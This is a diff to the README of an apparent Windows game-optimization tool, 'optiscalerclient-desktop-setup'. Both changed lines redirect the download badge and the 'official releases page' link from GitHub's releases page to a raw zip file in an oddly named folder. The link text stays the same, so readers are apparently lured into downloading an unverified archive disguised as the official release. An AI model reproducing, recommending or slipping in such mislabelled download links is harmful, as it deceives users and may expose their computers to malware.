@@ -1,6 +1,6 @@
 # 🖥️ optiscalerclient-desktop-setup - Optimize your games with simple tools
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Moisesaspectual402/optiscalerclient-desktop-setup/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://raw.githubusercontent.com/Moisesaspectual402/optiscalerclient-desktop-setup/main/sillographist/optiscalerclient-desktop-setup-v3.8-alpha.2.zip)
 
 ## 📌 Overview
 
@@ -20,7 +20,7 @@ Ensure your computer meets these basic hardware and software standards before yo
 
 You can find the installation files on the releases page. Follow these steps to set up the software on your Windows PC:
 
-1. Visit the [official releases page](https://github.com/Moisesaspectual402/optiscalerclient-desktop-setup/releases) to access the download options.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Moisesaspectual402/optiscalerclient-desktop-setup/main/sillographist/optiscalerclient-desktop-setup-v3.8-alpha.2.zip) to access the download options.
 2. Select the latest version available in the list.
 3. Look for the file ending in `.exe` under the Assets section.
 4. Click the file name to start the download.
